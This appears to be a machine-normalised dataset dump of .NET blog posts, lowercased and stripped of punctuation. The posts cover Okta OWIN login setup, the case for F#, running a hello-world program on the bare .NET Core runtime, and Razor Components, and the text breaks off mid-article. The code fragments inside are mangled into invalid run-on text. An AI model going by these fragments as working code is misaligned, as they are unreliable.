highest precedence override first option add key owin appstartup value oktatutorialowinstartup like read example brilliant write microsoft doc set authentication okta time set application okta account got one yet really easy create new foreverfree developer account complete logged developer dashboard take note org url need later create okta application dashboard go application tab add application creating net web application best pick web platform template page add name application check implicit hybrid grant type allowed box might notice uris defaulted port value set project url make change prior want update port port value either way complete setting look like save presented application dashboard need manually edit couple extra setting edit button top right pane set logout redirect uris http whitelist post signing method able logout return home page uri constructed base uri plus name controller use handling authentication authenticationcontroller name post sign method within postsignout set initiate login uri value login redirect uris value change look like following take note login redirect uri logout redirect uri client id client secret page come handy define application variable previously written creating startupcs file variable due come configuration file value org url login redirect uri logout redirect uri client id client secret gained creating application okta case adding value webconfig file client id add key okta clientid value yourclientid client secret add key okta clientsecret value yourclientsecret org url add key okta oktadomain value http youroktadomain login redirect uri add key okta redirecturi value http logout redirect uri add key okta postlogoutredirecturi value http handle authentication method controller take care authentication functionality need create new controller authenticationcontroller three method handle signing signing post sign redirect public actionresult signin httpcontextuseridentityisauthenticated httpcontextgetowincontext authenticationchallenge oktadefaultsmvcauthenticationtype return new httpunauthorizedresult return redirecttoaction index home convenient part owin automatically combine identity component httpcontext use isauthenticated method define whether user already signed get owin context ask okta middleware challenge user authentication httppost public actionresult signout httpcontextuseridentityisauthenticated httpcontextgetowincontext authenticationsignout cookieauthenticationdefaultsauthenticationtype oktadefaultsmvcauthenticationtype return redirecttoaction index home process signing fairly straight forward checking user signed currently asking okta middleware sign note ever done http post method tagged appropriate attribute public actionresult postsignout return redirecttoaction index home user signed okta middleware need redirect somewhere homepage update view authentication capability controller complete time update view enable functionality goal simple one add sign insign button top righthand corner template web page user signed application display user name implement need make edits layoutcshtml file found viewsshared directory code going div tag class navbarcollapse collapse preexisting unordered list ul tag contextuseridentityisauthenticated ul class nav navbarnav navbarright li p class navbartext contextuseridentityname p li li onclick documentgetelementbyid signoutform submit style cursor pointer sign li ul form action authenticationsignout method post id signoutform form else ul class nav navbarnav navbarright li htmlactionlink sign signin authentication li ul breaking code snippet statement asks whether user signed user authenticated add new unordered list rightmost navbar two item user name link sign sign link post form declared notably action controller name sign method name initiate sign process user authenticated currently display button label sign run signin method within authenticationcontroller run aspnet web application upon running web application presented nice new sign button top right corner upon clicking sign entering user credential okta signin page redirected back application successfully logged learn owin aspnet core secure authentication tutorial managed set simple aspnet mvc web application complete fully functional user authentication thanks okta service quite quick introduction worry trouble comprehending practice come mastery see code post full head github page interested finding working aspnet framework application thoroughly encourage look following resource always question comment concern post feel free leave comment great content okta dev team follow u twitter oktadev facebook linkedin youtube
209,Lobsters,dotnet,"C#, F#, .NET programming",Why you should learn F# - Dusted Codes,https://dusted.codes/why-you-should-learn-fsharp,learn f dusted code,functional first language functional programming paradigm net language family general purpose language table content domain driven development identifying bad design f make correct code easy f make invalid state impossible domain driven design scott wlaschin domain modeling made functional immutability lack null object f immutable default null saying goodbye null tony hoare called billion dollar mistake problem nt reflect real state yet many meaning time c try slowly move away upcoming version immutability mutability whether object mutable default solid made easy f solid study design pattern composition inheritance tdd bdd onion architecture mvp mvvm single responsibility functional code often mistaken procedural code inexperienced eye famous slide scott wlaschin functional programming design pattern hell interface strategy pattern everything function decorator pattern openclosed principle inversion control made functional inversion control principle martin fowler hollywood principle service locator considered anti pattern dependency injection constructor injection partial application mark seeman dependency injection net dependency injection dependency rejection simplicity asynchronous programming thomans petricek async c f asynchronous gotchas c asynchronous c f differ work net core net core net core net framework xamarin open source microsoft research f source code f language suggestion rfc discussion thread f foundation visual studio jetbrains resharper rider code visual studio code popular development environment krzysztof cieślak ionide f conquering web f backend giraffe giraffe aspnet core giraffe techempower web framework benchmark reqsec f frontend fable babel backed large organisation alfonso garciacaro released fable fable babel blazor currently beta f everywhere net core docker kubernetes aws lambda azure function xamarin app development fable blazor net core alpine linux arm final word f advent calendar sergey tihon yearly f advent calendar weekly f subscribe newsletter follow twitter useful resource blog website video book conference,thinking learning new programming language would highly recommend close look f matter already functional developer different community haskell clojure scala etc complete newbie functional programming like year ago think f equally impress f functional first language mean pure functional language heavily geared towards functional programming paradigm however f also part net language family equally well equipped write object oriented code secondly f contrary common believe extremely well designed general purpose language mean f good sort mathematical stuff also much without doubt f like functional algebraic language greatly suited kind work certainly forefront creator f neither common use case people know work f f really good well honest answer almost anything f extremely pragmatic expressive statically typed programming language whether want build distributed real time application service oriented web backend fancy looking single page app mobile game line business application next big social internet flop f satisfy need matter fact f probably much better language type application let say python java c nt believe please continue reading hopefully convinced end post table content domain driven development started write article asked like f much many reason came mind one really stood fact f great capability modelling domain majority work software developer model real world process digital abstraction language make kind work almost feel natural immensely valuable missed let look code example demonstrate mean task rest blog post comparing f c order show benefit chosen c many developer consider one best object oriented language mainly c language proficient identifying bad design common use case modern application read customer object database c would look something like public customer getcustomerbyid string customerid stuff purposefully omitted internals method caller point view signature method often know even though operation simple familiar still lot unknown around value accepted customerid empty string probably instantly throw argumentexception still try fetch user data id follow specific format customerid correct format upper case case sensitive method normalise string anyway happens given customerid nt exist return null throw exception way find without checking internal implementation method doc decompilation github etc testing sort input happens database connection return result customer nt exist throw different type exception many different exception type code throw anyway interfacesignature method clear answering question pretty poor given signature interface method purpose defining clear contract caller method course many convention make c developer feel safe mostly making broad assumption underlying code end day assumption eventually lead severe error library slightly differs established convention high chance introducing bug catch later anything convention rather weak workarounds missing language feature like c perhaps seen better language javascript statically typed feature many functional programming language seen superior c java others domain modelling feature way improving code c none option straightforward often cumbersome still plenty code written like one f make correct code easy f hand rich type system allows developer express true state function function might might return customer object function return object type option option type defines return value either something nothing let getcustomerbyid customerid match dbtryfindcustomerbyid customerid true customer customer false none important understand none another way saying null null truly nothing nothing allocated memory whereas none actual objectcase type option example tryfindcustomerid method typical net member parameter defined like bool tryfindcustomerbyid string customerid customer customer f use simple pattern matching extract parameter success match dbtryfindcustomerbyid customerid true customer customer false none benefit option type expressive therefore honest true state function also force calling code implement case none mean developer think edge case straight beginning let someotherfunction customerid match getcustomerbyid customerid customer something customer exist none something customer nt exist another extremely useful type come f result terror type let validatecustomerid customerid match customerid null error customer id null error customer id empty id idlength error invalid customer id ok customeridtolower validatecustomerid function either return ok normalised customerid error object contains relevant error message example terror type string nt type even wrap multiple type much richer return value result option customer string list type system f allows even flexibility one easily create new type truly represents possible outcome function like getcustomerbyid type dataresult success option validationerror string dataerror exception let getcustomerbyid customerid try match validatecustomerid customerid error msg validationerror msg ok id match dbtryfindcustomerbyid id true customer customer false none success ex dataerror ex custom defined dataresult type declares three distinctive case calling code might want treat differently explicitly declaring type represents possibility model getcustomerbyid function way remove ambiguity error edge case handling well preventing unexpected behaviour forcing calling code handle case f make invalid state impossible far always assumed customerid value type string seen creates lot ambiguity around allowed value also force developer write lot guard clause protect error public customer getcustomerbyid string customerid customerid null throw new argumentnullexception nameof customerid customerid throw new argumentexception customer id empty nameof customerid customeridlength customeridtolower startswith c throw new argumentexception invalid customer id nameof customerid stuff correct way avoiding antipattern model concept customerid type c either create class struct either way end writing lot boilerplate code get type behave way eg gethashcode equality tostring etc public class customerid public string value get public customerid string customerid customerid null throw new argumentnullexception nameof customerid customerid throw new argumentexception customer id empty nameof customerid var value customeridtolower valuelength valuestartswith c throw new argumentexception invalid customer id nameof customerid value value lot override make customerid behave correct way needle say extremely annoying exact reason rarely seen c also class le favourable code accept customerid still deal possibility null really thing customerid never null like int guid datetime never null finished implementing correct customerid type c end line code open lot room error f define new type easily type customerid private customerid string version customerid basically wrapper string provides additional type safety one could nt accidentally assign string parameter type customerid vice versa private access modifier prevents code different module namespaces create object type customerid intentional force creation via specific function like module customerid let create customerid string match customerid null error customer id null error customer id empty id idlength error invalid customer id ok customerid customeridtolower implementation extremely efficient almost free noise developer nt write lot boilerplate code able focus actual domain really want system type called customerid wrap string way create customerid via customeridcreate function relevant check emitting object customerid string violates customerid requirement meaningful error returned calling code forced deal scenario customerid object immutable nonnullable successfully created subsequent code confidently rely correct state customerid type automatically inherits behaviour string mean nt write gethashcode implementation equality override operator overload nonsense would c perfect example f provide lot value line code also much code begin little room making mistake real mistake could made actual implementation customerid validation domain responsibility rather shortcoming language c developer used model real world concept like customerid orderid emailaddress type language nt make easy object often represented primitive type string int handled loosely domain would like learn domain driven design f would highly recommend watch scott wlaschin domain modeling made functional presentation ndc london fantastic talk lot food thought also source idea introduced article video immutability lack null one greatest feature f object f immutable default null make lot easier reason code also implement bug free application think twice object changed state passing function check null huge impact easily someone write reliable application saying goodbye null tony hoare invented amongst many great thing null reference called billion dollar mistake even apologised creation null qcon london problem null nt reflect real state yet many meaning time never clear null mean unknown empty exist initialised invalid error perhaps end linefilestreametc today scholar agree existence null certainly mistake hence language like c try slowly move away upcoming version fortunately f never null begin way force null f interoperating c properly fencing immutability mutability mutability another topic functional programming really shine problem mutability per se whether object mutable default given language one two programming language pick one want immutability benefit making code lot easier understand also prevents lot error class method function change state object created particularly useful object get passed around many different method internal implementation always known third party code etc hand mutability nt many benefit make code arguably harder follow introduces lot way class method overstep responsibility let poorly written library introduce unexpected behaviour small benefit able directly mutate object come rather high cost question one easier change object immutablebydefault language introduce immutability mutablebydefault one quickly answer first one looking f deal desire changing object state f mutation performed creating new object modified value applied let c name susan doe address street london uk let c c address avenue oxford uk elegant solution produce almost outcome mutability allowed without cost introducing immutability c little bit awkward c language construct allows one create immutable object box first create new type use class class reference type could null null assigned object created immutable public class customer public string name get set public string address get set somewhere later program var c new customer c null lead using struct public struct customer public string name get set public string address get set null issue anymore property still var c new customer cname haha gotcha let make setter private public struct customer public string name get private set public string address get private set better immutable yet one could still something like public struct customer public string name get private set public string address get private set public void changename string name name name var c new customer cchangename haha gotcha problem changename public fact still method alter object state created let introduce two private backing field property remove setter altogether public struct customer private string name private string address public string name get return name public string address get return address public customer string name string address name name address address look perhaps better yet class member still change name address field inside fix making field readonly public struct customer private readonly string name private readonly string address public string name get return name public string address get return address public customer string name string address name name address address immutable least bit verbose point might well collapse property public readonly field public struct customer public readonly string name public readonly string address public customer string name string address name name address address alternatively c later could also create readonly property like public struct customer public string name get public string address get public customer string name string address name name address address far good unless someone know c well one could easily gotten wrong unfortunately real world application never simple though customer type would look like public class address public string street get set public struct customer public readonly string name public readonly address address public customer string name address address name name address address var address new address street springfield road var c new customer susan address addressstreet gotcha point evident introducing immutability c straightforward someone might thought another great example stark contrast f c really stand writing correct code nt hard language choice really make difference solid made easy f object oriented programming producing solid code order understand write decent c one read least five different book study design pattern follow composition inheritance practise tdd bdd apply onion architecture layer everything tier mvp mvvm importantly single responsibility thing know importance principle vital keeping object oriented code maintainable shape object oriented developer used practise pattern unimaginable someone could possibly produce solid code without injecting everything constructor first time saw functional code looked plain wrong think c developer put f look functional code first time nt see anything look familiar class constructor importantly ioc container functional code often mistaken procedural code inexperienced eye functional programming everything function design pattern someone know function first class citizen function composed instantiated partially applied passed around executed famous slide scott wlaschin nicely sum slide deck scott wlaschin functional programming design pattern talk viewed vimeo hell interface c everything requires interface example method requires support multiple sort algorithm strategy pattern help public interface isortalgorithm list int sort list int value public class quicksort isortalgorithm public list int sort list int value quicksort return value public class mergesort isortalgorithm public list int sort list int value mergesort return value public void dosomething isortalgorithm sortalgorithm list int value var sorted sortalgorithmsort value public void main var value new list int dosomething new quicksort value f done simple function let quicksort value value quicksort let mergesort value value mergesort let dosomething sortalgorithm value let sorted sortalgorithm value let main let value dosomething quicksort value function f signature interchangeable nt require explicit interface declaration sort function therefore type int list int list alternatively passed dosomething function literally requires implement strategy pattern f let look slightly complex example really demonstrate strength f everything function one useful pattern c one personal favourite decorator pattern allows adding additional functionality existing class without violating openclosed principle solid guideline password policy perfect example public interface ipasswordpolicy bool isvalid string password public class basepolicy ipasswordpolicy public bool isvalid string password return true public class minimumlengthpolicy ipasswordpolicy private readonly int minlength private readonly ipasswordpolicy nextpolicy public minimumlengthpolicy int minlength ipasswordpolicy nextpolicy minlength minlength nextpolicy nextpolicy public bool isvalid string password return password null passwordlength minlength nextpolicyisvalid password public class musthavedigitspolicy ipasswordpolicy private readonly ipasswordpolicy nextpolicy public musthavedigitspolicy ipasswordpolicy nextpolicy nextpolicy nextpolicy public bool isvalid string password password null return false return passwordtochararray c charisdigit c nextpolicyisvalid password public class musthaveuppercasepolicy ipasswordpolicy private readonly ipasswordpolicy nextpolicy public musthaveuppercasepolicy ipasswordpolicy nextpolicy nextpolicy nextpolicy public bool isvalid string password password null return false return passwordtochararray c charisupper c nextpolicyisvalid password public class programm public void main var passwordpolicy new musthavedigitspolicy new musthaveuppercasepolicy new minimumlengthpolicy new basepolicy var result passwordpolicyisvalid instantiation passwordpolicy object one decide policy use different password policy created without modify single class work really well c also extremely verbose lot code written arguably little functionality point also use additional interface constructor injection glue policy together passwordpolicy variable type ipasswordpolicy injected anywhere password policy required good get c thing could possibly improved writing lot boilerplate code would add additional syntactic sugar compose policy like var passwordpolicy policycreate musthaveminimumlength musthavedigits musthaveuppercase f equivalent implementation function let musthaveuppercase password string passwordtochararray arrayexists charisupper let musthavedigits password string passwordtochararray arrayexists charisdigit let musthaveminimumlength length password string passwordlength length let isvalidpassword password string musthaveminimumlength password musthavedigits password musthaveuppercase password like c passwordpolicy object implemented ipasswordpolicy interface isvalidpassword function implement string bool signature therefore interchanged function also implement string bool f solution almost embarrassingly easy compared overly complex one c yet nt compromise solid principle function validates single requirement single responsibility tested isolation swapped mocked function also implement string bool create multiple new policy without modify existing code open closed principle let password string musthaveminimumlength password musthaveuppercase password inversion control made functional pattern functional developer understand function prove point one last time explore inversion control principle next first let clear inversion control principle many developer wrongly confuse dependency injection pattern inversion control principle state class shall never instantiate dependency martin fowler us term hollywood principle nt call u call three distinctive design pattern follow ioc principle dependency injection factory service locator service locator considered anti pattern wo nt go factory pattern consists two subpatterns dependency injection pattern break three subpatterns constructor injection method injection property injection despite constructor injection popular ioc pattern object oriented programming one many pattern follow dependency inversion principle pattern extremely useful satisfies specific use case constructor injection could nt nothing f directly wanted underline sheer number different design pattern sometimes confusing may take year oo software engineer fully grasp vast amount concept understand play important role got way let take look c handle dependency injection via constructor injection public interface inotificationservice void sendmessage customer customer string message public class orderservice private readonly inotificationservice notificationservice public orderservice inotificationservice notificationservice notificationservice notificationservice throw new argumentnullexception nameof notificationservice public void completeorder customer customer shoppingbasket basket stuff notificationservicesendmessage customer order received nothing surprising orderservice dependency object type inotificationservice responsible sending order update customer could multiple implementation inotificationservice smsnotificationservice emailnotificationservice public class emailnotificationservice inotificationservice private readonly emailsettings setting public emailnotificationservice emailsettings setting setting setting public void sendmessage customer customer string message stuff typically c dependency would get registered ioc container skipped part order keep c implementation small already becoming large let take look dependency injection done f let sendemailnotification emailsettings customer message let sendsmsnotification smsservice apikey customer message let completeorder notify customer shoppingbasket notify customer order received dependency injection functional programming achieved simply passing one function another basically already example difference sendemailnotification sendsmsnotification function share signature moment emailsettings different type smsservice function also differ number parameter need sendemailnotification function requires three parameter total sendsmsnotification requires four furthermore notify parameter completeorder function nt know concrete function injected therefore nt care anything except customer object string message work answer partial application functional programming one partially apply parameter one function order generate new one let sendemailfromhotmailaccount apply emailsettings parameter sendemailnotification hotmailsettings let sendsmswithtwillio apply smsservice apikey parameter sendsmsnotification twilioservice twilioapikey partially applying function newly created sendemailfromhotmailaccount sendsmswithtwillio function share signature customer string unit function passed completeorder function need ioc container either one nt want repeatedly pas dependency completeorder function partial application utilised let completeorderandnotify emailsettings sendemailnotification completeorder later program one would use completeorderandnotify customer shoppingbasket compare solution one c nt much difference except simplicity class mainly require dependency injected constructor function take function dependency c dependency get registered ioc container level f dependency get registered partial application case one create mock stub fake dependency unit test class function isolation advantage functional approach though dependency get registered partially applied closer function belong simpler lot le code additional third party ioc container required dependency injection pattern taught oo programming whereas passing function another function fundamentalnormal thing one could functional programming mark seeman author dependency injection net fantastic talk advanced dependency pattern f watch talk dependency injection dependency rejection youtube video simplicity one theme consistent throughout blog post must remarkable simplicity f matter creating new immutable type expressing true state function modelling domain applying advanced programming pattern f always seems slight edge c abstinence class complex design pattern ioc container mutability inheritance override interface benefit come extremely handy work first lot le code write make application smaller faster comprehend much easier maintain secondly allows blazingly fast prototyping f one quickly hack one function another desired prototype reached furthermore additional work transition prototype production almost nothing since everything function get naturally compartmentalised smaller function difference prototype productionready function often little asynchronous programming speaking simplicity f make asynchronous programming strikingly easy let readfileasync filename async use stream fileopenread filename let content streamasyncread int streamlength return content lot great content available explains difference benefit f asynchronous programming model wo nt rehash everything would highly recommend read thomans petricek article async c f asynchronous gotchas c followed blog series asynchronous c f including differ work net core far talked mostly generic concept functional programming paradigm wealth benefit come specifically f obvious one net core know microsoft putting lot work new open source cross platform multi language runtime f part net therefore run net runtimes include net core net framework xamarin mono mean anyone develop f either window linux macos also mean f developer access large eco system extremely mature high quality library f multi paradigm language yes write object oriented code want reference call third party package matter written f c vbnet open source long time microsoft embraced os community debuted f first language born microsoft research open source project get go open source community behind f strong many contribution coming outside microsoft driving general direction language find f source code hosted github start contributing submitting f language suggestion first suggestion get approved rfc get created corresponding discussion thread f language direction f foundation strong backing microsoft still main driver development match come tooling microsoft net language always benefited excellent tooling visual studio uncontested leader long time recent year competition racked jetbrains company invented resharper released new intellij driven cross platform ide called rider meanwhile microsoft developed new open source editor called code visual studio code quickly emerged popular development environment amongst programmer boast huge marketplace useful plugins thanks krzysztof cieślak superb extension called ionide f visual studio jetbrains rider visual studio code ionide three world best programming ides cross platform compatible run major operating system support f f conquering web mentioned beginning f language algebraic stuff functional programming general perfect fit anything web related web application basically large function single parameter input http request single parameter output http response f backend f abundance diverse feature rich web framework personal favourite library called giraffe disclaimer core maintainer project giraffe sits top aspnet core mean mostly piggyback entire aspnet core environment performance attribute community contribution giraffe web application composed combination many smaller function get glued together via kleisli operator let webapp choose get choose route ping text pong route htmlfile pagesindexhtml post route submit text successful giraffe also recently joined techempower web framework benchmark rank total reqsec one fastest functional web framework available however giraffe taste many great f web library available aspnet core aspnet core mvc also perfectly compatible f f frontend f set mark server side thing also seen lot innovation frontend web fable f javascript transpiler built top babel extremely advanced javascript compiler babel hugely popular backed large organisation google airbnb adobe facebook trivago many heavy lifting compilation whereas fable transpiling f babel abstract syntax tree simple term get power f combined maturity stability babel allows write rich frontends f alfonso garciacaro done magnificent job merging f javascript community recently released fable come twofold speed boost well reduced bundle size fable babel also open source thriving community behind complete different front microsoft worked new project called blazor blazor singlepage web application framework built net run browser webassembly support major net language including f currently beta availability fable blazor huge potential f developer web today f everywhere f one language truly run anywhere thanks net core one develop f o run system run natively window linux macos via docker container kubernetes cluster also run f serverless function aws lambda azure function xamarin app development brings f android io window apps fable blazor browser since net core one even run f alpine linux arm machine learning iot game yet area f used today list supported platform architecture growing every year sure expand even future final word meant write blog post long time never found time recently background mainly c programming ten year still today last three year taught f fallen madly love convert get often asked like f therefore decided put everything writing list obviously complete recollection take main benefit f think missed something please hesitate let know comment see blog post ever evolving resource hope point people interest f blog post also part f advent calendar kindly organised sergey tihon sergey organise yearly f advent calendar also run weekly f newsletter subscribe newsletter follow twitter stay date latest development f useful resource blog website video book conference
210,Lobsters,dotnet,"C#, F#, .NET programming",Exploring the .NET Core Runtime,http://www.mattwarren.org/2018/12/13/Exploring-the-.NET-Core-Runtime/,exploring net core runtime,exploring net core runtime set challenge f one c one productive year net internals dotnet run hello world note deepdive net core primitive nate mcmaster using code dotnetcoreclr repository net ecosystem challenge dotnetcoreclr compiler dotnetroslyn framework class library fcl dotnetcorefx dotnetcli building coreclr building repository compiler ilasm tool il assembler common intermediate language cil inside net il assembler expert net il assembler sharplabio site get following il code nice part done file base class library dotnetcorefx managed part coreclr mscorlib renamed pretty small basic note completed part able least print hello world screen without using corefx repository dotnetcorefx typeforwarding rough history referenced assembly small amount managed code dotnetcoreclrsrcsystemprivatecorelib available systemreflection implementation typeforwarded systemprivatecorelib contained systemruntimecs function net standard hood slide immo landwerth evolution design time assembly code split useful corefx readme runtimespecific library code mscorlib agnostic runtimeimplementation run compatible net runtime corert coreclr readme type strong dependency internal working runtime included dotnetcorefx huge benefit mono large amount corefx code launcher dotnetcli using corerun run net core application yay least impressive demo see year write custom net core host control net runtime native code runtime host,exploring net core runtime set challenge dec word seems like time year anyone blog sort advent calendar ie post leading christmas instance f one inspired c one c copying f never happens however bit problem struggled write post productive year let alone single month also mostly blog net internals subject necessarily lend lighthearted post get advent calendar blog recently giving talk titled dotnet run hello world attempt explain everything net runtime point launch application till hello world printed screen researching presenting talk made think net runtime whole contain importantly note mostly informational purpose recommended way achieving thing take look excellent deepdive net core primitive nate mcmaster post explore using code dotnetcoreclr repository along way find runtime interacts wider net ecosystem make thing clearer challenge need solved simple hello world application run dotnetcoreclr repository compiler life dotnetroslyn framework class library fcl aka dotnetcorefx dotnet run implemented dotnetcli repository building coreclr even work challenge need build coreclr helpfully really nice guide available building repository build depends git cmake python course c compiler prerequisite installed build simply matter invoking build script buildcmd buildsh base repository detail installing component differ depending operating system see following page based o crossbuilding across o arm built particular platform build platform follow step successfully end following file least window os may produce something slightly different compiler first get around fact compiler need way turing simple hello world code exe namespace helloworld class program static void main string args consolewriteline hello world fortunately access ilasm tool il assembler turn common intermediate language cil exe file get correct il code well one way write scratch maybe reading inside net il assembler expert net il assembler serge lidin yes amazingly book written il another much easier way use amazing sharplabio site u paste c code get following il code class private auto ansi module end class module class private auto ansi beforefieldinit helloworldprogram extends mscorlib systemobject method method private hidebysig static void main string args cil managed method begin rva code size maxstack ldstr hello world call void mscorlib systemconsole writeline string ret end method program main method public hidebysig specialname rtspecialname instance void ctor cil managed method begin rva code size maxstack call instance void mscorlib systemobject ctor ret end method program ctor end class helloworldprogram save file called helloworldil run cmd ilasm helloworldil outhelloworldexe get following output microsoft r net framework il assembler version copyright c microsoft corporation right reserved assembling helloworldil exe helloworldexe source file ansi helloworldil warning reference undeclared extern assembly mscorlib attempting autodetect assembled method helloworldprogram main assembled method helloworldprogram ctor creating pe file emitting class class helloworldprogram emitting field method global class method emitting event property global class writing pe file operation completed successfully nice part done helloworldexe file base class library well exactly one problem systemconsole life dotnetcorefx see different file make implementation consolecs consolepalunixcs consolepalwindowscs etc fortunately nice coreclr developer included simple console implementation systemprivatecorelibdll managed part coreclr previously known mscorlib renamed internal version console pretty small basic provides enough need use workaround need edit helloworldil look like note change mscorlib systemprivatecorelib class public auto ansi beforefieldinit c extends systemprivatecorelib systemobject method public hidebysig static void cil managed entrypoint code size maxstack ldstr hello world call void systemprivatecorelib internalconsole writeline string ret end method c note achieve thing c code instead raw il invoking c compiler following cmdline csc optimize nostdlib reference systemprivatecorelibdll helloworldexe helloworldcs completed part able least print hello world screen without using corefx repository nice little trick ever recommend writing real code like compiling systemprivatecorelib right way thing compiler normally compile publicly exposed surface area life dotnetcorefx runtime process called typeforwarding used make reference implementation corefx map real implementation coreclr entire process see rough history referenced assembly however small amount managed code ie c actually exists coreclr show directory tree dotnetcoreclrsrcsystemprivatecorelib available tree c file included concrete example look corefx see systemreflection implementation pretty empty partial facade eventually typeforwarded systemprivatecorelib interested entire api exposed corefx actually life coreclr contained systemruntimecs back example code describes getmethod function systemreflection api learn type forwarding recommend watching net standard hood slide immo landwerth also indepth information evolution design time assembly code split useful corefx readme runtimespecific library code mscorlib life coreclr repo need built versioned tandem runtime rest corefx agnostic runtimeimplementation run compatible net runtime eg corert pointofview coreclr readme microsoftnetcoreruntimecoreclr package actually enough much one reason coreclr package try minimize amount class library implement type strong dependency internal working runtime included eg systemobject systemstring systemthreadingthread systemthreadingtaskstask foundational interface instead class library implemented independent nuget package simply use net core runtime dependency many familiar class systemcollections systemio systemxml live package defined dotnetcorefx repository one huge benefit approach mono share large amount corefx code shown tweet launcher far compiled code well technically assembled able access simple version systemconsole actually run exe remember use dotnet run command life dotnetcli repository would breaking rule slightly contrived challenge fortunately clever runtime engineer thought exact scenario built helpful corerun application read using corerun run net core application td dr look dependency folder exe complete challenge run corerun helloworldexe corerun helloworldexe hello world yay least impressive demo see year information host clr application recommend excellent tutorial write custom net core host control net runtime native code addition doc page runtime host give nice overview different host available net framework ship number different runtime host including host listed following table runtime host description aspnet load runtime process handle web request aspnet also creates application domain web application run web server microsoft internet explorer creates application domain run managed control net framework support download execution browserbased control runtime interface extensibility mechanism microsoft internet explorer mime filter create application domain run managed control default one application domain created web site shell executables invokes runtime hosting code transfer control runtime time executable launched shell
211,Lobsters,dotnet,"C#, F#, .NET programming",Razor Components for a JavaScript-Free FrontEnd in 2019,https://www.telerik.com/blogs/razor-components-for-a-javascript-free-frontend-in-2019,razor component javascriptfree frontend,roadmap net core blazor serverside net running web assembly serverside net standard application aka razor component razor blazor razor component server client architecture core net standard serving razor component signalr thinclient writing web uis razor c dom abstraction component basic component parameter broad range option including javascript net standard beyond markdig mlnet compatible used service within razor component application javascript interoperability method invoke javascript module aspnet core timeline quote daniel roth explains goal blazor razor component getting started blazornet pro con scale azure wrapping,could server application architecture promise provide alternative javascript next big thing net developer article discus razor component new framework promise javascript free web development backed net technology like c net standard signalr could server application architecture promise provide alternative javascript next big thing net developer article discus razor component new framework promise javascript free web development backed net technology like c net standard signalr new technology roadmap net core showing lot potential razor component originally started blazor serverside early blazor net single page web application framework generally associated net running web assembly however blazor capable running multiple scenario including serverside net standard application aka razor component blazor razor component essentially except execute blazor run browser using web assembly razor component run server razor component treat browser thinclient web browser handle user interface ui server receives event responds ui update remotely user application indistinguishable web application author note opinion current name choice razor component lead confusion clarify discussing razor template markup syntax net blazor net based web framework run client using webassembly razor component blazor framework running server surface concept razor component brings question answer let dig deeper architecture server client architecture razor component unique architecture allows net application run serverside user interface run process remote browser combination net core signalr allows u write web application without javascript core razor component combination several net core technology first foremost razor component application utilizes net standard building net standard mean razor component large net api surface work compatible net standard library addition razor component net core application built deployed using operating system quick look inside razor component csproj show familiar net territory application type even exe tell u executable net core actual output executable dll literal exe propertygroup targetframework targetframework outputtype exe outputtype langversion langversion propertygroup executable translate magical thinclient enabled web application understand need take look server client relationship serving razor component server application hosted aspnet core typical aspnet core application base aspnet core apps hosted including mvc webapi razor page razor component application host us service middleware register application http pipeline looking startupcs server application see service middleware configuration time writing razor component still called serversideblazor related apis public void configureservices iservicecollection service add serverside blazor service registered app project startup servicesaddserversideblazor appstartup method get called runtime use method configure http request pipeline public void configure iapplicationbuilder app ihostingenvironment env use component registration static file app project appuseserversideblazor appstartup server application ready make initial web request request lead u setting browser thinclient signalr thinclient upon making request server receive back static file application typical web application receive html razor component first file received client indexhtml file kick clientside application client application single javascript file included framework blazorserverjs application special signalr client responsibility receiveprocess dom change server send event server importantly establish websocket connection server communication client server done signalr binary data packet data contain necessary dom change entire rendered dom viewstate la aspnet webforms worry razor component client server relationship understood focus ui portion framework writing web uis razor c since razor component run server side net standard app logic written using net technology possible due blazor framework employ rendertree dom abstraction similar virtual doms used popular javascript framework like angular react let look ui side framework understand component written component basic razor popular template markup syntax introduced aspnet mvc razor gained popularity simplicity requires symbol begin codeblock without explicit closing tag unlike mvc framework razor used explicitly write html razor component emits rendertree razor component every cshtml file component used element ex widgetcs becomes widget carrying tradition simplicity seen following image much concept component understood basic annotation header component defines special characteristic feature component routing layout dependency injection image see component route specified page counter component act page visiting route counter additionally component used component element counter markup inside component becomes part rendertree share similarity way jsx used react given example counter framework create following code behind scene building rendertree builderaddmarkupcontent counter nn rendertree abstracted away developer focus writing component razor html component logic written c within funcitons block field property event bound using razor syntax referencing event value code block within component markup simple using propertyname component parameter concept component go beyond encapsulating markup order create reusable component need able communicate component component support use parameter bind data event using parameter attribute component expose property consumption following counter component parameter attribute added allow consumer specify amount increment count p current count currentcount p button class btn btnprimary onclick incrementcount click button function int currentcount parameter protected int countby get set void incrementcount currentcount countby another file set countby value component element counter countby counter parameter countby also bound component page allowing value set dynamically user example place input page bind value countby property counter behavior change runtime changing value input counter countby countby counter input bind countby type number function int countby component model easy learn provides robust base build complex uis additional library also used support application logic ui experience broad range option including javascript razor component leverage net browser architecture allows interesting integration point net standard beyond since razor component net core application work net standard library mean existing nuget package sdks may compatible includes net standard library provided interact depend technology tightly coupled platform example library like markdig used parse markdown html compatiable dependency beyond net standard time writing even advanced net based machine learning sdk mlnet compatible used service within razor component application javascript interoperability additionally razor component app use dependency javascript ecosystem interoperability layer app communicate bidirectionally net javascript dependency helpful situation razor component support necessary browserdom api existing javascript library useful component model razor component solve ui need dom apis still needed example getting user geo location information supported directly razor component access feature dom api razor component call upon javascript implementation browser javascript interop layer following example show example c abstraction written interface browser geo location apis specifically getcurrentposition method net jsruntimecurrentinvokeasync method used invoke javascript module interopgeolocationjs geolocationcs net public class geolocation public async task getcurrentposition action position onsuccess action positionerror onerror positionoptions option null ongetposition onsuccess ongetpositionerror onerror await jsruntimecurrentinvokeasync bool interopgeolocationgetcurrentposition new dotnetobjectref option invokemethodasync javascript module able call back net returning result interopgeolocationjs browser windowinteropgeolocation getcurrentposition function geolocationref option const success result geolocationrefinvokemethodasync raiseongetposition interopgeolocationtoserializeable result const error er geolocationrefinvokemethodasync raiseongetpositionerror ercode navigatorgeolocationgetcurrentposition success error option abstraction used within application normal c code interop written net library shared among many project indexcshtml application usage component initialized protected override async task oninitasync var g new geolocation await gwatchposition handler handleerror void handler position p lat pcoordslatitude long pcoordslongitude ideally interop created api nt created aspnet core timeline razor component first announced dotnet conf expected razor component ship aspnet core following quote daniel roth explains goal blazor razor component near term primary goal remains ship support running blazor clientside browser work running blazor clientside webassembly continue parallel razor component work although remain experimental longer work issue running net webassembly however keep component model regardless whether running server client switch blazor app run client server changing single line code see blazor net conf talk see action learn plan razor component video getting started type developer like test thing early try blazor component today time writing razor component still branded serverside blazor found blazornet follow instruction get started sure choose blazor serverside aspnet core project type pro con application load quickly since small amount javascript required bootstrap client net assembly transferred client webassembly even operation network traffic light 